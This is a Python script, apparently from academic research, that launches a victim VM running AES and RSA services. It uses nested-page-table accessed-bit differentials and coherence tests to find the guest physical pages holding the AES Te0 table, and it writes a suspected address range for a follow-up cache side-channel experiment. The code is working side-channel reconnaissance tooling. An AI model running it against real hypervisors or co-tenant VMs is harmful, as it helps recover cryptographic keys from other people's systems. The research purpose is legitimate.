def select_cluster_pages(ranking: list[dict[str, int]], args: argparse.Namespace) -> list[int]:
    """选择最佳cluster（向后兼容接口）"""
    clusters = select_multiple_clusters(ranking, args, top_n=1)
    if not clusters:
        raise RuntimeError("no clusters found")
    return clusters[0]


def select_multiple_clusters(
    ranking: list[dict[str, int]],
    args: argparse.Namespace,
    top_n: int = 5
) -> list[list[int]]:
    """
    组合策略选择top N个候选clusters:
    1. 找到所有trigger_hits高的页面（忽略baseline）
    2. 按地址聚类，找连续簇
    3. 优先选择大簇（更可能是Te0/Te1/Te2/Te3区域）
    """
    if not ranking:
        raise RuntimeError("empty NPT ranking result")

    # 策略1: 找到所有trigger_hits高的页面（忽略baseline_hits）
    # 因为baseline污染会导致真实Te0的score降低
    min_trigger_hits = args.min_trigger_hits if hasattr(args, 'min_trigger_hits') else 95

    pos = [
        row
        for row in ranking
        if int(row["trigger_hits"]) >= min_trigger_hits
    ]

    if not pos:
        # Fallback: 使用原来的score过滤
        pos = [row for row in ranking if int(row["score"]) >= args.min_score]

    if not pos:
        pos = ranking[: max(1, args.top_pages)]

    # 不限制top_pages，因为我们要找所有高trigger_hits的页面
    page_trigger_hits = {int(r["page_gpa"]): int(r["trigger_hits"]) for r in pos}
    pages = sorted(page_trigger_hits.keys())

    if not pages:
        raise RuntimeError("no candidate pages after filtering")

    print(f"[cluster] Found {len(pages)} pages with trigger_hits >= {min_trigger_hits}")

    # 策略2: 按地址聚类，找连续簇
    gap_bytes = max(0, args.cluster_gap_pages) * PAGE_SZ
    clusters: list[list[int]] = []
    cur: list[int] = [pages[0]]

    for p in pages[1:]:
        if p - cur[-1] <= max(PAGE_SZ, gap_bytes):
            cur.append(p)
        else:
            clusters.append(cur)
            cur = [p]
    clusters.append(cur)

    # 策略3: 改进的cluster排序 - 优先考虑"高质量小cluster"
    def score_of(cluster: list[int]) -> tuple[float, float, int]:
        """
        改进的评分函数：
        1. Quality score: 优先选择所有页面都是100 hits的小cluster (4-10页)
           - Te0/Te1/Te2/Te3通常是4-6页的紧凑cluster
           - 大cluster (>20页) 通常是代码段或库
        2. Baseline consistency bonus: Te0表的所有页面baseline_hits应该一致
           - 如果所有页面baseline_hits都相同（特别是都=1），说明是核心数据结构
        3. 平均trigger_hits
        4. 紧凑度（负的span）
        """
        cluster_size = len(cluster)

        # 获取每个页面的完整信息
        cluster_pages_info = []
        for page_gpa in cluster:
            for row in ranking:
                if row['page_gpa'] == page_gpa:
                    cluster_pages_info.append(row)
                    break

        avg_hits = sum(p['trigger_hits'] for p in cluster_pages_info) / cluster_size if cluster_size > 0 else 0.0
        span = cluster[-1] - cluster[0]

        # Baseline consistency check
        baseline_hits = [p['baseline_hits'] for p in cluster_pages_info]
        baseline_consistent = len(set(baseline_hits)) == 1  # All same
        baseline_is_1 = all(b == 1 for b in baseline_hits)  # All equal to 1

        # Quality score: 优先考虑4-10页的高质量cluster
        if 4 <= cluster_size <= 10 and avg_hits >= 99.5:
            if baseline_is_1:
                # 所有baseline_hits=1: 最高优先级（Te0特征）
                quality = 10000.0
            elif baseline_consistent:
                # baseline一致但不是1: 高优先级
                quality = 5000.0
            else:
                # baseline不一致: 中等优先级
                quality = 1000.0
        elif 10 < cluster_size <= 20 and avg_hits >= 99.5:
            quality = 500.0   # 中等优先级
        elif cluster_size > 20:
            quality = float(cluster_size)  # 大cluster按size排序
        else:
            quality = float(cluster_size) * 0.1  # 小但质量不高的cluster降低优先级

        return (quality, avg_hits, -span)

    # 按评分排序
    clusters_sorted = sorted(clusters, key=score_of, reverse=True)

    # 打印top N clusters
    print(f"[cluster] Found {len(clusters)} clusters, showing top {min(len(clusters), top_n)}:")
    for i, c in enumerate(clusters_sorted[:top_n]):
        avg_hits = sum(page_trigger_hits.get(p, 0) for p in c) / len(c) if c else 0.0
        span = c[-1] - c[0]
        quality, _, _ = score_of(c)
        pages_str = ', '.join(f'0x{p:x}' for p in c[:3])
        if len(c) > 3:
            pages_str += f', ... ({len(c)} total)'
        print(f"  #{i+1}: size={len(c)}, avg_hits={avg_hits:.1f}, quality={quality:.1f}, span=0x{span:x}, pages=[{pages_str}]")

    return clusters_sorted[:top_n]


def parse_guest_oracle_from_console(console_log_path: Path) -> dict[str, int] | None:
    """从console log中解析guest输出的oracle信息"""
    if not console_log_path.exists():
        return None

    try:
        with console_log_path.open("r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        print(f"[oracle] Failed to read console log: {e}")
        return None

    import re
    pattern = r"victim_aes_oracle:.*te0_gpa=(0x[0-9a-fA-F]+).*te0_page_gpa=(0x[0-9a-fA-F]+)"
    match = re.search(pattern, content)

    if not match:
        return None

    return {
        "te0_gpa": int(match.group(1), 16),
        "te0_page_gpa": int(match.group(2), 16),
    }


def verify_seed_with_oracle(
    cluster_pages: list[int],
    console_log_path: Path
) -> dict[str, object]:
    """用oracle验证seed结果"""
    oracle = parse_guest_oracle_from_console(console_log_path)

    if oracle is None:
        print("[oracle] No oracle information found in console log")
        return {"oracle_available": False}

    oracle_page = oracle["te0_page_gpa"]
    is_correct = oracle_page in cluster_pages

    result = {
        "oracle_available": True,
        "oracle_te0_gpa": f"0x{oracle['te0_gpa']:x}",
        "oracle_page_gpa": f"0x{oracle_page:x}",
        "seed_correct": is_correct,
        "selected_cluster": [f"0x{p:x}" for p in cluster_pages],
    }

    if is_correct:
        print(f"[oracle] ✓ CORRECT: oracle page 0x{oracle_page:x} found in cluster")
    else:
        print(f"[oracle] ✗ WRONG: oracle page 0x{oracle_page:x} NOT in cluster")
        print(f"[oracle]   Selected cluster: {result['selected_cluster']}")

    return result


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        description="Derive 5.3 suspected GPA range from reference VM using only AES/RSA service interfaces."
    )
    ap.add_argument("--outdir", default="")
    ap.add_argument("--skip-build", action="store_true")

    ap.add_argument("--cpu-model", default="host,pmu=on")
    ap.add_argument(
        "--guest-extra-cmdline",
        default="nokaslr norandmaps",
        help="Extra kernel cmdline passed to guest via QEMU -append",
    )
    ap.add_argument("--qemu-cpu", type=int, default=32)
    ap.add_argument("--smp", default="1")
    ap.add_argument("--mem", default="4G")

    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--aes-port", type=int, default=9000)
    ap.add_argument("--rsa-port", type=int, default=9001)
    ap.add_argument("--sock-timeout-s", type=float, default=3.0)
    ap.add_argument("--vm-ready-timeout-s", type=int, default=180)
    ap.add_argument("--net-mode", choices=["auto", "user", "tap"], default="auto")
    ap.add_argument("--tap-ifname", default="")
    ap.add_argument("--tap-host-ip", default="192.168.76.1")
    ap.add_argument("--tap-guest-ip", default="192.168.76.2")

    ap.add_argument("--scan-start-gpa", default="0x0")
    ap.add_argument("--scan-end-gpa", default="")
    ap.add_argument("--discover-rounds", type=int, default=100, help="Number of NPT discovery rounds (default: 100, was 12)")
    ap.add_argument("--trigger-requests-per-round", type=int, default=50, help="AES requests per round (default: 50, was 16)")
    ap.add_argument("--baseline-wait-ms", type=int, default=5)

    ap.add_argument("--top-pages", type=int, default=1000, help="Max pages to consider (increased for combined strategy)")
    ap.add_argument("--min-score", type=int, default=2)
    ap.add_argument("--min-trigger-hits", type=int, default=95, help="Minimum trigger_hits for clustering (default: 95)")
    ap.add_argument("--cluster-gap-pages", type=int, default=4, help="Max gap between pages in a cluster (default: 4, was 2)")
    ap.add_argument("--pad-pages", type=int, default=2)
    ap.add_argument("--coherence-reps", type=int, default=8, help="Coherence test repetitions (default: 8)")
    ap.add_argument("--coherence-lines", type=int, default=16, help="Number of cache lines to test (default: 16, max: 64)")
    ap.add_argument("--max-test-clusters", type=int, default=50, help="Max clusters to test with correlation (default: 50, increased from 20)")

    ap.add_argument(
        "--te0-symbol-bin",
        default="",
        help=(
            "Optional symbol source for Te0 offset. "
            "If omitted, auto-detect from local VM artifact "
            "(src/build/guest_victim_aes), then fallback candidates."
        ),
    )
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    require_root("[!] run_53_seed_range.py requires root. Use: sudo -E python3 src/scripts/run_53_seed_range.py")

    outdir = Path(args.outdir).resolve() if args.outdir else timestamped_outdir_ch5("exp5_3_seed")
    outdir.mkdir(parents=True, exist_ok=True)
    print_banner("Experiment 5.3 seed: suspected GPA range (service-only)", outdir)

    ensure_artifacts(args.skip_build, outdir / "build_stage")
    collect_host_facts(outdir)

    symbol_bin = resolve_te0_symbol_bin(args.te0_symbol_bin)
    print(f"[seed] te0_symbol_bin={symbol_bin}")
    te0 = compute_te0_offset(symbol_bin)

    scan_start = parse_u64(args.scan_start_gpa) & ~(PAGE_SZ - 1)
    if args.scan_end_gpa:
        scan_end = parse_u64(args.scan_end_gpa)
    else:
        scan_end = default_scan_end_for_mem(parse_mem_to_bytes(args.mem))
    scan_end = (scan_end + (PAGE_SZ - 1)) & ~(PAGE_SZ - 1)
    if scan_end <= scan_start:
        raise SystemExit(f"[seed] invalid scan range: start=0x{scan_start:x}, end=0x{scan_end:x}")

    vm_dir = outdir / "vm_seed"
    vm_dir.mkdir(parents=True, exist_ok=True)
    proc, runtime_host, net_mode, net_cleanup, npt_sock = launch_reference_vm(args, vm_dir)
    args.host = runtime_host
    npt: NptCtlClient | None = None
    try:
        ready = wait_vm_ready(runtime_host, args.aes_port, args.vm_ready_timeout_s)
        if not ready:
            raise SystemExit(f"[seed] victim services not ready; see {vm_dir / 'qemu.log'}")
        if not wait_nptctl_ready(npt_sock, args.vm_ready_timeout_s):
            raise SystemExit(f"[seed] nptctl preload not ready; see {vm_dir / 'qemu.log'}")

        npt = NptCtlClient(sock_path=npt_sock, timeout_s=args.sock_timeout_s)
        npt.connect()
        ranking = npt_discovery(npt, args, scan_start, scan_end, outdir)

        # 获取更多候选clusters（增加到20个）
        max_test = args.max_test_clusters if hasattr(args, 'max_test_clusters') else 20
        candidate_clusters = select_multiple_clusters(ranking, args, top_n=max_test)

        # 使用输入相关性+coherence验证候选
        print("\n[seed] Verifying candidates with input correlation + coherence...")
        verification = verify_multiple_candidates(
            npt,
            candidate_clusters,
            te0["te0_inpage_offset"],
            runtime_host,
            args.aes_port,
            args.sock_timeout_s,
            ranking,
            max_candidates=max_test,
        )

        # 保存验证结果
        write_json(outdir / "coherence_verification.json", verification)

        # 选择最佳cluster
        if verification["success"]:
            print(f"\n[seed] ✓ Verification successful!")
            print(f"[seed]   Best page: 0x{verification['best_page']:x}")
            print(f"[seed]   Correlation score: {verification.get('best_correlation', 0):.1f}")
            print(f"[seed]   Coherence SNR: {verification.get('best_coherence_snr', 0):.2f}")
            print(f"[seed]   Combined score: {verification.get('best_combined_score', 0):.2f}")

            # 使用验证的完整cluster（而不是只有best_page）
            cluster_pages = verification.get("best_cluster_pages", [verification["best_page"]])
            print(f"[seed]   Cluster size: {len(cluster_pages)} pages")
            print(f"[seed]   Cluster pages: {[f'0x{p:x}' for p in cluster_pages]}")
        else:
            print(f"\n[seed] ⚠ Verification failed, using NPT-only result")
            # 回退到NPT discovery的结果
            cluster_pages = candidate_clusters[0] if candidate_clusters else []

        if not cluster_pages:
            raise RuntimeError("no cluster pages selected")

        # Oracle验证
        console_log = vm_dir / "qemu_console.log"
        oracle_verification = verify_seed_with_oracle(cluster_pages, console_log)
        write_json(outdir / "oracle_verification.json", oracle_verification)

        pad = max(0, args.pad_pages) * PAGE_SZ
        cluster_start = min(cluster_pages)
        cluster_end = max(cluster_pages) + PAGE_SZ
        suspected_start = max(0, cluster_start - pad) & ~(PAGE_SZ - 1)
        suspected_end = (cluster_end + pad + (PAGE_SZ - 1)) & ~(PAGE_SZ - 1)

        # 生成完整的guest cmdline（包含oracle参数）
        guest_cmdline_base = str(args.guest_extra_cmdline).strip()
        if not guest_cmdline_base:
            guest_cmdline_base = "nokaslr norandmaps"

        # 确保有nokaslr和norandmaps
        cmdline_tokens = guest_cmdline_base.split()
        if "nokaslr" not in cmdline_tokens:
            cmdline_tokens.insert(0, "nokaslr")
        if "norandmaps" not in cmdline_tokens:
            cmdline_tokens.insert(1, "norandmaps")

        # 添加oracle参数（用于验证）
        cmdline_tokens.append("oracle_te0=1")
        cmdline_tokens.append(f"oracle_te0_vma=0x{te0['te0_vma']:x}")
        cmdline_tokens.append(f"oracle_te0_off=0x{te0['te0_inpage_offset']:x}")

        guest_cmdline_full = " ".join(cmdline_tokens)

        result = {
            "method": "service_only_npt_accessed_differential",
            "te0_symbol_bin": str(symbol_bin),
            "te0_symbol_vma": f"0x{te0['te0_vma']:x}",
            "te0_file_offset": f"0x{te0['te0_file_offset']:x}",
            "te0_inpage_offset": f"0x{te0['te0_inpage_offset']:x}",
            "seed_scan_start_gpa": f"0x{scan_start:x}",
            "seed_scan_end_gpa": f"0x{scan_end:x}",
            "net_mode": net_mode,
            "trigger_host": runtime_host,
            "guest_cmdline_extra": guest_cmdline_full,
            "discover_rounds": int(args.discover_rounds),
            "trigger_requests_per_round": int(args.trigger_requests_per_round),
            "cluster_pages": [f"0x{p:x}" for p in cluster_pages],
            "cluster_start_gpa": f"0x{cluster_start:x}",
            "cluster_end_gpa_exclusive": f"0x{cluster_end:x}",
            "pad_pages": int(args.pad_pages),
            "suspected_scan_start_gpa": f"0x{suspected_start:x}",
            "suspected_scan_end_gpa": f"0x{suspected_end:x}",
            "suggested_discovery_cmd": (
                "sudo -E python3 src/scripts/run_53.py "
                f"--suspected-range-json {outdir / 'suspected_gpa_range_53.json'} "
                "--discover-only"
            ),
            "suggested_full_cmd": (
                "sudo -E python3 src/scripts/run_53.py "
                f"--suspected-range-json {outdir / 'suspected_gpa_range_53.json'} "
                "--line-reps 32 --samples 20000 "
                "--checkpoints 1000,2000,5000,10000,20000"
            ),
        }
        write_json(outdir / "suspected_gpa_range_53.json", result)
        write_lines(
            outdir / "stats_seed_53.txt",
            [
                "=== 5.3 Seed GPA Range (service-only) ===",
                f"te0_symbol_bin={symbol_bin}",
                f"te0_symbol_vma=0x{te0['te0_vma']:x}",
                f"te0_file_offset=0x{te0['te0_file_offset']:x}",
                f"te0_inpage_offset=0x{te0['te0_inpage_offset']:x}",
                f"seed_scan_start_gpa=0x{scan_start:x}",
                f"seed_scan_end_gpa=0x{scan_end:x}",
                f"net_mode={net_mode}",
                f"trigger_host={runtime_host}",
                f"guest_cmdline_extra={guest_cmdline_full}",
                f"cluster_pages={','.join(f'0x{p:x}' for p in cluster_pages)}",
                f"suspected_scan_start_gpa=0x{suspected_start:x}",
                f"suspected_scan_end_gpa=0x{suspected_end:x}",
                f"pad_pages={args.pad_pages}",
                result["suggested_discovery_cmd"],
                result["suggested_full_cmd"],
            ],
        )
        print("\n=== seed range done ===")
        print(f"data dir: {outdir}")
        print(result["suggested_discovery_cmd"])
        print(result["suggested_full_cmd"])
    finally:
        if npt is not None:
            npt.close()
        stop_proc(proc, timeout_s=5.0)
        if net_cleanup is not None:
            net_cleanup()
        chown_to_sudo_user(outdir)


if __name__ == "__main__":
    main()
